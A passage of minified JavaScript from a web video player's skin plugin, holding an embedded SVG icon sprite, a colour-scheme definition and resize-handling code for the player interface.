x="10.0781" width="79.9745" style="fill:white;" height="10.0484"/>\n        <rect y="24.9455" x="10.0781" width="79.9745" style="fill:white;" height="10.0484"/>\n        <rect y="64.9455" x="10.0781" width="79.9745" style="fill:white;" height="10.0484"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SHARE_LINKEDIN_bradmax_player_v2.14.380" height="100%"><g id="Layer2"><g><path style="fill:#fff;fill-rule:nonzero;" d="M25.379,15.252c0,5.315 -3.924,9.62 -10.381,9.62c-6.074,0 -9.998,-4.304 -9.998,-9.62c0,-5.443 4.051,-9.621 10.252,-9.621c6.203,0 10.002,4.178 10.127,9.621ZM5.506,94.368l0,-61.9l19.242,0l0,61.901l-19.242,0l0,-0.001Z"/><path style="fill:#fff;fill-rule:nonzero;" d="M36.262,52.215c0,-7.721 -0.252,-14.176 -0.504,-19.747l16.707,0l0.889,8.608l0.379,0c2.531,-4.053 8.734,-10.002 19.115,-10.002c12.658,-3.55271e-15 22.152,8.482 22.152,26.71l0,36.585l-19.242,0l0,-34.306c0,-7.976 -2.785,-13.417 -9.748,-13.417c-5.316,0 -8.479,3.67 -9.871,7.215c-0.508,1.265 -0.635,3.038 -0.635,4.811l0,35.697l-19.242,0l0,-42.154Z"/></g></g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_LIVE_NOTSYNC_bradmax_player_v2.14.380" height="100%"><g id="live">\n    <circle transform="matrix(0.943772, 0, 0, 0.910487, -3.935531, 3.495057)" style="fill: white;" r="15.804" cy="51.077" cx="19.974"/>\n    <path style="fill: white;" d="M 40.084 37.291 L 40.084 60.013 L 51.433 60.013 L 51.433 62.926 L 36.541 62.926 L 36.541 37.291 L 40.084 37.291 Z M 55.2 44.806 L 58.47 44.806 L 58.47 62.926 L 55.2 62.926 L 55.2 44.806 Z M 59.202 39.119 C 59.202 39.426 59.137 39.711 59.005 39.975 C 58.875 40.247 58.705 40.49 58.496 40.704 C 58.277 40.909 58.028 41.071 57.75 41.189 C 57.472 41.308 57.171 41.368 56.849 41.368 C 56.534 41.368 56.243 41.308 55.973 41.189 C 55.694 41.071 55.449 40.909 55.24 40.704 C 55.022 40.49 54.852 40.247 54.731 39.975 C 54.609 39.711 54.548 39.426 54.548 39.119 C 54.548 38.804 54.609 38.506 54.731 38.225 C 54.852 37.944 55.022 37.701 55.24 37.496 C 55.449 37.282 55.694 37.116 55.973 36.998 C 56.243 36.88 56.534 36.819 56.849 36.819 C 57.171 36.819 57.472 36.88 57.75 36.998 C 58.028 37.116 58.277 37.282 58.496 37.496 C 58.705 37.701 58.875 37.944 59.005 38.225 C 59.137 38.506 59.202 38.804 59.202 39.119 Z M 69.424 62.926 L 61.866 44.806 L 64.547 44.806 C 64.8 44.806 65.012 44.87 65.187 44.997 C 65.352 45.134 65.475 45.291 65.553 45.471 L 70.248 57.124 C 70.421 57.559 70.555 57.99 70.653 58.416 C 70.748 58.849 70.839 59.275 70.927 59.693 C 71.023 59.275 71.127 58.849 71.241 58.416 C 71.354 57.99 71.493 57.559 71.659 57.124 L 76.418 45.471 C 76.497 45.275 76.614 45.113 76.771 44.985 C 76.936 44.866 77.141 44.806 77.386 44.806 L 79.935 44.806 L 72.378 62.926 L 69.424 62.926 Z M 89.823 44.512 C 90.929 44.512 91.954 44.695 92.895 45.061 C 93.837 45.428 94.647 45.952 95.326 46.633 C 96.014 47.323 96.551 48.17 96.935 49.176 C 97.319 50.182 97.51 51.332 97.51 52.626 C 97.51 53.121 97.452 53.453 97.341 53.624 C 97.236 53.793 97.031 53.879 96.726 53.879 L 84.383 53.879 C 84.41 55.02 84.566 56.013 84.854 56.856 C 85.15 57.709 85.555 58.416 86.07 58.977 C 86.584 59.548 87.195 59.975 87.9 60.255 C 88.607 60.536 89.399 60.677 90.28 60.677 C 91.099 60.677 91.805 60.583 92.399 60.396 C 92.981 60.208 93.487 60.009 93.915 59.795 C 94.341 59.582 94.7 59.382 94.987 59.195 C 95.275 59.007 95.524 58.913 95.733 58.913 C 96.001 58.913 96.21 59.016 96.36 59.22 L 97.275 60.383 C 96.864 60.86 96.381 61.274 95.824 61.623 C 95.265 61.98 94.664 62.271 94.02 62.492 C 93.382 62.721 92.72 62.892 92.032 63.003 C 91.353 63.122 90.676 63.181 90.006 63.181 C 88.724 63.181 87.542 62.968 86.462 62.543 C 85.381 62.117 84.449 61.495 83.665 60.677 C 82.871 59.859 82.256 58.849 81.82 57.648 C 81.384 56.447 81.168 55.064 81.168 53.495 C 81.168 52.234 81.364 51.054 81.756 49.956 C 82.156 48.857 82.727 47.907 83.469 47.105 C 84.208 46.297 85.119 45.662 86.2 45.202 C 87.273 44.742 88.48 44.512 89.823 44.512 Z M 89.888 46.863 C 88.319 46.863 87.081 47.307 86.175 48.192 C 85.276 49.078 84.714 50.31 84.489 51.885 L 94.582 51.885 C 94.582 51.145 94.478 50.466 94.268 49.853 C 94.059 49.24 93.753 48.713 93.353 48.269 C 92.952 47.818 92.458 47.468 91.875 47.221 C 91.3 46.982 90.637 46.863 89.888 46.863 Z"/>\n  </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_CHROMECAST_bradmax_player_v2.14.380" height="100%"><g transform="matrix(4.24798,0,0,4.24798,-0.975773,-0.975773)" id="cast">\n        <path style="fill:white;" d="M1,18L1,21L4,21C4,19.34 2.66,18 1,18ZM1,14L1,16C3.76,16 6,18.24 6,21L8,21C8,17.13 4.87,14 1,14ZM1,10L1,12C5.97,12 10,16.03 10,21L12,21C12,14.92 7.07,10 1,10ZM21,3L3,3C1.9,3 1,3.9 1,5L1,8L3,8L3,5L21,5L21,19L14,19L14,21L21,21C22.1,21 23,20.1 23,19L23,5C23,3.9 22.1,3 21,3Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_PLAY_bradmax_player_v2.14.380" height="100%"><g transform="matrix(1, 0, 0, 1, 10.350433, 0)" id="play">\n<path style="fill:#FFF;fill-rule:nonzero;" d="M85.2184,46.152L21.0081,6.3721C16.3296,3.30161 12.5001,5.5606 12.5001,11.3911L12.5001,88.6108C12.5001,94.4383 16.3296,96.6973 21.0081,93.6298L85.2184,53.8499C85.2184,53.8499 87.4999,52.2449 87.4999,50.001C87.4999,47.757 85.2184,46.152 85.2184,46.152Z"/>\n</g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_MAXIMIZE_bradmax_player_v2.14.380" height="100%"><g id="maximize">\n        <path style="fill:white;fill-rule:nonzero;" d="M59.199,5L72.9153,16.1022L55.6344,32.8138L67.0447,44.2241L83.7734,26.9249L95.1415,40.9425L95.1415,5L59.199,5L59.199,5ZM32.8138,55.6344L16.0942,72.9245L4.85851,59.0575L4.85851,95L40.801,95L26.934,83.7643L44.2241,67.0447L32.8138,55.6344Z"/>\n    </g></g><g width="100%" id="bradmax_ICON_AD_PLAY_bradmax_player_v2.14.380" height="100%"><g>\n\t\t<rect y="0" x="0" width="100px" ry="6" rx="6" height="100px" fill="rgba(68,68,68,0.75)"/>\n\t\t<path fill="rgba(255,255,255,0.7)" d="M40,35 L40,65 L65,50 L40,35 Z"/>\n\t</g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_SERIES_PLAY_bradmax_player_v2.14.380" height="100%"><g id="Layer1">\n        <g>\n            <circle style="fill:#000000;fill-opacity:0.596078;" r="44.0322" cy="50" cx="50"/>\n            <path style="fill:rgb(209,209,211);" d="M50,1.26572C76.9152,1.26572 98.7343,23.0848 98.7343,50C98.7343,76.9152 76.9152,98.7343 50,98.7343C23.0848,98.7343 1.26572,76.9152 1.26572,50C1.26572,23.0848 23.0848,1.26572 50,1.26572ZM50,5.96776C74.3183,5.96776 94.0322,25.6817 94.0322,50C94.0322,74.3183 74.3183,94.0322 50,94.0322C25.6817,94.0322 5.96776,74.3183 5.96776,50C5.96776,25.6817 25.6817,5.96776 50,5.96776Z"/>\n            <path style="fill:rgb(211,211,213);" d="M64.8377,51.0148L40.247,64.8277L40.247,37.2019L64.8377,51.0148Z"/>\n        </g>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_AUDIO_bradmax_player_v2.14.380" height="100%"><g id="audio">\n        <path style="fill:white;fill-rule:nonzero;" d="M34.5041,15.815L34.5069,71.6147C31.4684,70.9817 27.9333,71.2197 24.4274,72.5203C16.54,75.4507 13.7572,82.5792 15.8488,88.4381C17.9403,94.3017 24.1095,96.6744 31.9969,93.7449C38.6956,91.2565 43.079,85.7418 42.9708,80.546C42.9708,80.546 42.9708,50.9552 42.9708,34.4525L76.3562,26.8011L76.3562,62.2113C73.3177,61.5784 69.7826,61.8163 66.2767,63.1169C58.3893,66.0463 55.6065,73.1758 57.698,79.0347C59.7896,84.8983 65.9588,87.271 73.8462,84.3415C80.5449,81.8532 84.9283,76.3385 84.8201,71.1426L84.8201,5L34.5041,15.815Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SHARE_TWITTER_bradmax_player_v2.14.380" height="100%"><g id="Layer2"><path style="fill:#fff;fill-rule:nonzero;" d="M95,22.0968c-3.3125,1.46785 -6.86684,2.46329 -10.6011,2.90758c3.81304,-2.28332 6.73186,-5.90514 8.11535,-10.2075c-3.57683,2.1146 -7.52484,3.64994 -11.7316,4.48228c-3.36874,-3.5937 -8.16034,-5.83203 -13.475,-5.83203c-10.1962,0 -18.4634,8.2672 -18.4634,18.4578c0,1.44535 0.163094,2.85696 0.478035,4.20671c-15.3421,-0.770481 -28.9464,-8.12098 -38.0516,-19.2901c-1.59158,2.72199 -2.49703,5.89389 -2.49703,9.27951c0,6.40567 3.26189,12.0577 8.21096,15.3646c-3.02568,-0.101231 -5.8714,-0.933575 -8.36281,-2.31707l0,0.230582c0,8.94207 6.36631,16.405 14.8078,18.1035c-1.54659,0.416172 -3.17753,0.646754 -4.86471,0.646754c-1.19228,0 -2.34519,-0.118103 -3.4756,-0.343061c2.35081,7.33925 9.16703,12.6764 17.243,12.8226c-6.31569,4.94907 -14.2792,7.8904 -22.9288,7.8904c-1.49035,0 -2.9582,-0.0899831 -4.40355,-0.253078c8.17159,5.24714 17.8729,8.30657 28.2997,8.30657c33.963,0 52.5277,-28.131 52.5277,-52.5277l-0.0618634,-2.39018c3.62744,-2.58701 6.76561,-5.83766 9.23452,-9.53821Z"/></g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SPINNER_bradmax_player_v2.14.380" height="100%"><g id="spinner 2">\n        <path style="fill-opacity:0.901961;fill-rule:nonzero;" id="100" d="M56.8906,24.2656L56.8906,11.9375C56.8906,10.0312 56.2187,8.39844 54.875,7.03906C53.5312,5.67969 51.9062,5 50,5C48.0625,5 46.4141,5.67969 45.0547,7.03906C43.6953,8.39844 43.0156,10.0312 43.0156,11.9375L43.0156,24.2656C43.0156,26.1719 43.6953,27.8047 45.0547,29.1641C46.4141,30.5234 48.0625,31.2187 50,31.25C51.9062,31.25 53.5312,30.5625 54.875,29.1875C56.2187,27.8125 56.8906,26.1719 56.8906,24.2656L56.8906,24.2656Z"/>\n        <path style="fill-opacity:0.780392;fill-rule:nonzero;" id="87.5" d="M38.6562,31.8125C38.6562,29.9062 37.9844,28.2656 36.6406,26.8906L27.9219,18.1719C26.5781,16.8281 24.9531,16.1562 23.0469,16.1562C21.1406,16.1562 19.5156,16.8281 18.1719,18.1719C16.8281,19.5469 16.1562,21.1875 16.1562,23.0937C16.1562,25 16.8281,26.625 18.1719,27.9687L26.8906,36.6875C28.2344,38.0312 29.8594,38.7031 31.7656,38.7031C33.6719,38.7031 35.2969,38.0312 36.6406,36.6875C37.9844,35.3437 38.6562,33.7187 38.6562,31.8125L38.6562,31.8125Z"/>\n        <path style="fill-opacity:0.65098;fill-rule:nonzero;" id="75" d="M31.2031,50C31.2031,48.0937 30.5156,46.4609 29.1406,45.1016C27.7656,43.7422 26.125,43.0625 24.2187,43.0625L11.8906,43.0625C9.98438,43.0625 8.35938,43.7422 7.01562,45.1016C5.67188,46.4609 5,48.0937 5,50C5,51.9062 5.67187,53.5391 7.01562,54.8984C8.35938,56.2578 9.98438,56.9375 11.8906,56.9375L24.2188,56.9375C26.1562,56.9375 27.8047,56.2578 29.1641,54.8984C30.5234,53.5391 31.2031,51.9062 31.2031,50L31.2031,50Z"/>\n        <path style="fill-opacity:0.521569;fill-rule:nonzero;" id="62.5" d="M38.6562,68.1875C38.6562,66.2812 37.9844,64.6406 36.6406,63.2656C35.2969,61.9219 33.6719,61.25 31.7656,61.25C29.8594,61.25 28.2344,61.9219 26.8906,63.2656L18.125,71.9844C16.7812,73.3281 16.1094,74.9609 16.1094,76.8828C16.1094,78.8047 16.7812,80.4375 18.125,81.7812C19.5,83.125 21.1406,83.7969 23.0469,83.7969C24.9531,83.7969 26.5781,83.125 27.9219,81.7812L36.6406,73.0625C37.9844,71.7187 38.6562,70.0937 38.6562,68.1875L38.6562,68.1875Z"/>\n        <path style="fill-opacity:0.4;fill-rule:nonzero;" id="50" d="M56.8906,88.0625L56.8906,75.6875C56.8906,73.7812 56.2109,72.1562 54.8516,70.8125C53.4922,69.4688 51.8594,68.7969 49.9531,68.7969C48.0469,68.7969 46.4141,69.4687 45.0547,70.8125C43.6953,72.1562 43.0156,73.7812 43.0156,75.6875L43.0156,88.0625C43.0156,89.9687 43.6953,91.6016 45.0547,92.9609C46.4141,94.3203 48.0469,95 49.9531,95C51.8594,95 53.4922,94.3203 54.8516,92.9609C56.2109,91.6016 56.8906,89.9687 56.8906,88.0625L56.8906,88.0625Z"/>\n        <path style="fill-opacity:0.368627;fill-rule:nonzero;" id="47.5" d="M83.8438,76.9062C83.8438,75 83.1562,73.375 81.7812,72.0312L73.0156,63.3125C71.6719,61.9687 70.0469,61.2891 68.1406,61.2734C66.2344,61.2578 64.6094,61.9219 63.2656,63.2656C61.9219,64.6406 61.25,66.2812 61.25,68.1875C61.25,70.0938 61.9219,71.7188 63.2656,73.0625L72.0312,81.7812C73.375,83.125 75,83.7969 76.9062,83.7969C78.8125,83.7969 80.4375,83.125 81.7812,81.7812C83.1562,80.4375 83.8438,78.8125 83.8438,76.9062L83.8438,76.9062Z"/>\n        <path style="fill-opacity:0.25098;fill-rule:nonzero;" id="35" d="M95,50C94.9688,48.0937 94.2734,46.4609 92.9141,45.1016C91.5547,43.7422 89.9219,43.0625 88.0156,43.0625L75.7344,43.0625C73.8281,43.0625 72.1875,43.7422 70.8125,45.1016C69.4375,46.4609 68.75,48.0937 68.75,50C68.75,51.9062 69.4375,53.5391 70.8125,54.8984C72.1875,56.2578 73.8281,56.9375 75.7344,56.9375L88.0156,56.9375C89.9531,56.9375 91.6016,56.2578 92.9609,54.8984C94.3203,53.5391 95,51.9062 95,50L95,50Z"/>\n        <path style="fill-opacity:0.121569;fill-rule:nonzero;" id="22.5" d="M83.8438,23.0937C83.8438,21.1875 83.1719,19.5469 81.8281,18.1719C80.4844,16.8281 78.8516,16.1562 76.9297,16.1562C75.0078,16.1562 73.375,16.8281 72.0312,18.1719L63.2656,26.8906C61.9219,28.2656 61.25,29.9062 61.25,31.8125C61.25,33.7187 61.9219,35.3437 63.2656,36.6875C64.6094,38.0312 66.2344,38.7031 68.1406,38.7031C70.0469,38.7031 71.6719,38.0312 73.0156,36.6875L81.8281,27.9687C83.1719,26.625 83.8438,25 83.8438,23.0937L83.8438,23.0937Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_SHARE_EMBED_bradmax_player_v2.14.380" height="100%"><g id="share embed"><g><path style="fill:#fff;fill-rule:nonzero;" d="M94.4422,48.6485l-22.9694,-22.9694c-0.714252,-0.714252 -1.978,-0.714252 -2.69225,0l-4.97976,4.97976c-0.743774,0.743774 -0.743774,1.94943 0,2.69321l16.644,16.6421l-16.643,16.6449c-0.743774,0.743774 -0.743774,1.94943 0,2.69321l4.97976,4.97976c0.357126,0.357126 0.841865,0.559021 1.3466,0.559021c0.503786,0 0.989477,-0.201895 1.3466,-0.559021l22.9675,-22.9684c0.743774,-0.744726 0.743774,-1.95134 0,-2.69511Z"/><path style="fill:#fff;fill-rule:nonzero;" d="M36.1983,66.6391l-16.6411,-16.643l16.644,-16.6421c0.357126,-0.357126 0.558069,-0.840912 0.558069,-1.3466c0,-0.504738 -0.19999,-0.989477 -0.558069,-1.3466l-4.97976,-4.97976c-0.357126,-0.357126 -0.841865,-0.558069 -1.3466,-0.558069c-0.504738,0 -0.989477,0.200943 -1.3466,0.558069l-22.9703,22.9675c-0.743774,0.743774 -0.743774,1.94943 0,2.69416l22.9694,22.9684c0.357126,0.357126 0.841865,0.559021 1.3466,0.559021c0.504738,0 0.989477,-0.201895 1.3466,-0.559021l4.97976,-4.97976c0.743774,-0.742822 0.743774,-1.94848 -0.00190467,-2.69225Z"/><path style="fill:#fff;fill-rule:nonzero;" d="M63.0618,17.9519c-0.241893,-0.443788 -0.649493,-0.773297 -1.13328,-0.916147l-4.03695,-1.19137c-1.00757,-0.299033 -2.06847,0.279034 -2.3656,1.28756l-18.741,63.4665c-0.14285,0.484739 -0.0876149,1.00567 0.153326,1.4485c0.240941,0.444741 0.649493,0.773297 1.13328,0.917099l4.03695,1.19137c0.179991,0.0533308 0.361888,0.0790439 0.539974,0.0790439c0.821866,0 1.58088,-0.537117 1.82563,-1.3666l18.741,-63.4675c0.14285,-0.484739 0.0885672,-1.00567 -0.153326,-1.4485Z"/></g></g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_LIVE_bradmax_player_v2.14.380" height="100%"><g id="live">\n    <circle transform="matrix(0.943772, 0, 0, 0.910487, -3.935531, 3.495057)" style="fill: rgb(218, 54, 54);" r="15.804" cy="51.077" cx="19.974"/>\n    <path style="fill: white;" d="M 40.084 37.291 L 40.084 60.013 L 51.433 60.013 L 51.433 62.926 L 36.541 62.926 L 36.541 37.291 L 40.084 37.291 Z M 55.2 44.806 L 58.47 44.806 L 58.47 62.926 L 55.2 62.926 L 55.2 44.806 Z M 59.202 39.119 C 59.202 39.426 59.137 39.711 59.005 39.975 C 58.875 40.247 58.705 40.49 58.496 40.704 C 58.277 40.909 58.028 41.071 57.75 41.189 C 57.472 41.308 57.171 41.368 56.849 41.368 C 56.534 41.368 56.243 41.308 55.973 41.189 C 55.694 41.071 55.449 40.909 55.24 40.704 C 55.022 40.49 54.852 40.247 54.731 39.975 C 54.609 39.711 54.548 39.426 54.548 39.119 C 54.548 38.804 54.609 38.506 54.731 38.225 C 54.852 37.944 55.022 37.701 55.24 37.496 C 55.449 37.282 55.694 37.116 55.973 36.998 C 56.243 36.88 56.534 36.819 56.849 36.819 C 57.171 36.819 57.472 36.88 57.75 36.998 C 58.028 37.116 58.277 37.282 58.496 37.496 C 58.705 37.701 58.875 37.944 59.005 38.225 C 59.137 38.506 59.202 38.804 59.202 39.119 Z M 69.424 62.926 L 61.866 44.806 L 64.547 44.806 C 64.8 44.806 65.012 44.87 65.187 44.997 C 65.352 45.134 65.475 45.291 65.553 45.471 L 70.248 57.124 C 70.421 57.559 70.555 57.99 70.653 58.416 C 70.748 58.849 70.839 59.275 70.927 59.693 C 71.023 59.275 71.127 58.849 71.241 58.416 C 71.354 57.99 71.493 57.559 71.659 57.124 L 76.418 45.471 C 76.497 45.275 76.614 45.113 76.771 44.985 C 76.936 44.866 77.141 44.806 77.386 44.806 L 79.935 44.806 L 72.378 62.926 L 69.424 62.926 Z M 89.823 44.512 C 90.929 44.512 91.954 44.695 92.895 45.061 C 93.837 45.428 94.647 45.952 95.326 46.633 C 96.014 47.323 96.551 48.17 96.935 49.176 C 97.319 50.182 97.51 51.332 97.51 52.626 C 97.51 53.121 97.452 53.453 97.341 53.624 C 97.236 53.793 97.031 53.879 96.726 53.879 L 84.383 53.879 C 84.41 55.02 84.566 56.013 84.854 56.856 C 85.15 57.709 85.555 58.416 86.07 58.977 C 86.584 59.548 87.195 59.975 87.9 60.255 C 88.607 60.536 89.399 60.677 90.28 60.677 C 91.099 60.677 91.805 60.583 92.399 60.396 C 92.981 60.208 93.487 60.009 93.915 59.795 C 94.341 59.582 94.7 59.382 94.987 59.195 C 95.275 59.007 95.524 58.913 95.733 58.913 C 96.001 58.913 96.21 59.016 96.36 59.22 L 97.275 60.383 C 96.864 60.86 96.381 61.274 95.824 61.623 C 95.265 61.98 94.664 62.271 94.02 62.492 C 93.382 62.721 92.72 62.892 92.032 63.003 C 91.353 63.122 90.676 63.181 90.006 63.181 C 88.724 63.181 87.542 62.968 86.462 62.543 C 85.381 62.117 84.449 61.495 83.665 60.677 C 82.871 59.859 82.256 58.849 81.82 57.648 C 81.384 56.447 81.168 55.064 81.168 53.495 C 81.168 52.234 81.364 51.054 81.756 49.956 C 82.156 48.857 82.727 47.907 83.469 47.105 C 84.208 46.297 85.119 45.662 86.2 45.202 C 87.273 44.742 88.48 44.512 89.823 44.512 Z M 89.888 46.863 C 88.319 46.863 87.081 47.307 86.175 48.192 C 85.276 49.078 84.714 50.31 84.489 51.885 L 94.582 51.885 C 94.582 51.145 94.478 50.466 94.268 49.853 C 94.059 49.24 93.753 48.713 93.353 48.269 C 92.952 47.818 92.458 47.468 91.875 47.221 C 91.3 46.982 90.637 46.863 89.888 46.863 Z"/>\n  </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_AD_MUTE_bradmax_player_v2.14.380" height="100%"><g id="volume">\n        <g>\n            <path style="fill:white;fill-rule:nonzero;" d="M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z"/>\n        </g>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_AD_UNMUTE_bradmax_player_v2.14.380" height="100%"><g id="Layer24">\n        <g id="mute">\n            <g id="volume">\n                <g>\n                    <path style="fill:white;fill-rule:nonzero;" d="M74.9192,5.30841C73.3952,4.6786 71.64,5.03023 70.4575,6.2094L45.7009,31.1234L26.6315,31.1234C24.3606,31.1234 22.5351,32.9558 22.5351,35.22L22.5351,64.7868C22.5351,67.0511 24.3606,68.8833 26.6315,68.8833L45.6103,68.8833L70.4709,93.7975C71.2546,94.5845 72.3099,95 73.3683,95C73.8908,95 74.4335,94.8995 74.9326,94.6885C76.47,94.0587 77.4649,92.5614 77.4649,90.9069L77.4649,9.09315C77.4614,7.43532 76.4566,5.93803 74.9192,5.30841Z"/>\n                </g>\n            </g>\n            <path style="fill:white;" d="M12.4687,5.41781L5.41781,12.4687L87.5313,94.5822L94.5822,87.5313L12.4687,5.41781Z"/>\n            <path style="fill:white;" d="M94.5822,12.4687L87.5313,5.41781L5.41781,87.5313L12.4687,94.5822L94.5822,12.4687Z"/>\n        </g>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_MINIMIZE_bradmax_player_v2.14.380" height="100%"><g id="minimize">\n        <path style="fill:white;fill-rule:nonzero;" d="M84.0544,4.64639L67.3349,21.9364L56.0991,8.06949L56.0991,44.012L92.0416,44.012L78.1747,32.7762L95.4647,16.0567L84.0544,4.64639Z"/>\n        <path style="fill:white;fill-rule:nonzero;" d="M8.04483,56.1094L21.7612,67.2116L4.48025,83.9232L15.8906,95.3335L32.6192,78.0343L43.9873,92.0519L43.9873,56.1094L8.04483,56.1094L8.04483,56.1094Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ARROW_UP_bradmax_player_v2.14.380" height="100%"><g>\n        <path d="M88.2595,78.5863L49.9998,41.899L11.7404,78.5863L1.16927,68.4496L49.9998,21.6255L98.8307,68.4496L88.2595,78.5863Z"/>\n    </g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_RELOAD_bradmax_player_v2.14.380" height="100%"><path style="fill:#fff;fill-rule:nonzero;" id="refresh" d="M79.4,20.6c-7.35,-7.875 -17.85,-12.6 -29.4,-12.6c-23.1,0 -42,18.9 -42,42c0,23.1 18.9,42 42,42c19.425,0 35.7,-13.65 40.425,-31.5l-11.025,0c-4.2,12.075 -15.75,21 -29.4,21c-17.325,0 -31.5,-14.175 -31.5,-31.5c0,-17.325 14.175,-31.5 31.5,-31.5c8.925,0 16.275,3.675 22.05,9.45l-16.8,16.8l36.75,0l0,-36.75l-12.6,12.6Z"/></g><g width="100%" id="bradmax_ICON_AD_PLAY_OVER_bradmax_player_v2.14.380" height="100%"><g>\n\t\t<rect y="0" x="0" width="100px" ry="6" rx="6" height="100px" fill="rgba(68,68,68,0.75)"/>\n\t\t<path fill="rgba(255,255,255,1)" d="M40,35 L40,65 L65,50 L40,35 Z"/>\n\t</g></g><g width="100%" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;" id="bradmax_ICON_PROGRESSBG_TIP_bradmax_player_v2.14.380" height="100%"><g transform="matrix(1,0,0,1,50,50)">\n        <g transform="matrix(1,0,0,1,-50,-50)" id="tip">\n            <g transform="matrix(10,0,0,10,-70,-50)" id="tip1">\n                <path style="fill-rule:nonzero;" d="M7,10L12,15L17,10L7,10Z"/>\n            </g>\n        </g>\n    </g></g></defs></svg>',id:"bradmax_player_v2.14.380-acd86bff1780b302209b59079cd538a3"},mc.parse('{"shades":{"COLOR_PROGRESS_2":-0.3,"COLOR_PROGRESS_1":-0.1,"COLOR_CONTROLS_1":0,"COLOR_CONTROLS_2":-0.2,"COLOR_CONTROLS_0":-0.2},"scheme":{"COLOR_BACKGROUND":"#222222","COLOR_PROGRESS_2":"#000000","COLOR_PROGRESS_1":"#000000","COLOR_SHADOW":"#000000","COLOR_PROGRESS_0":"#aaaaaa","COLOR_CONTROLS_1":"#000000","COLOR_BASE_1":"#ffffff","COLOR_BASE_0":"#000000","COLOR_BACKDROP":"#000000","COLOR_TEXT":"#ffffff","COLORS_SHADE_MAP_BASE":"#000000","COLOR_CONTROLS_2":"#000000","COLOR_CONTROLS_0":"#000000"}}'),this.pluginConfig=qc.skinConfig,this.display=new Xb,this.debunceTimer=null};wa["bs.player.plugin.skin.BasicSkin"]=qc,qc.__name__="bs.player.plugin.skin.BasicSkin",qc.main=function(){new qc},qc.__super__=lb,qc.prototype=Ja(lb.prototype,{skinStage:null,timer:null,debunceTimer:null,debounceTimerStop:function(){null!=this.debunceTimer&&this.debunceTimer.stop(),this.debunceTimer=null},debounceTimerStart:function(b){null==this.debunceTimer&&(this.debunceTimer=Rb.delay(b,100))},create:function(){var b=this;lb.prototype.create.call(this);var c=this.get_variables();Object.prototype.hasOwnProperty.call(c,"skinColor")&&mc.updateSchemeWithBase(m.field(this.get_variables(),"skinColor")),c=this.get_variables(),Object.prototype.hasOwnProperty.call(c,"skinColors")&&mc.updateSchemeWithColors(m.field(this.get_variables(),"skinColors")),lc.init(this.uid,this.context,qc.skinLayout,qc.skinStyles,mc.toDynamic()),this.skinStage=new md(qc.skinLayout,qc.skinStyles),this.skinStage.variables=this.get_variables(),this.skinStage.context=this.uid,this.skinStage.set_left(0),this.skinStage.set_top(0),this.skinStage.set_width(0),this.skinStage.set_height(0),this.skinStage.buildNativeElement(!1),this.prerenderFonts();var d=this.get_parentDisplay();this.skinStage.elementParent=this.get_parentDisplay(),this.skinStage.set_width(d.offsetWidth),this.skinStage.set_height(d.offsetHeight);var q=d.offsetWidth,X=d.offsetHeight,ra=d.offsetWidth,Aa=d.offsetHeight,Qa=new na("resize"),Wa=new Vb;Wa.x=ra,Wa.y=Aa,Qa.data=Wa,Qa.dispatch(this.context);var Cb=function(){b.debounceTimerStop(),Wa.y=Aa,Wa.x=ra,Qa.data=Wa,Qa.dispatch(b.context)};this.timer=new Rb(30),this.timer.run=function(){ra=d.offsetWidth,Aa=d.offsetHeight,ra==q&&Aa==X||(q=ra,b.skinStage.set_width(q),X=Aa,b.skinStage.set_height(X),b.debounceTimerStart(Cb))};for(var Ub=!1,Mb=0,Bc=(c=window.document.head.getElementsByTagName("svg")).length;Mb<Bc;){var 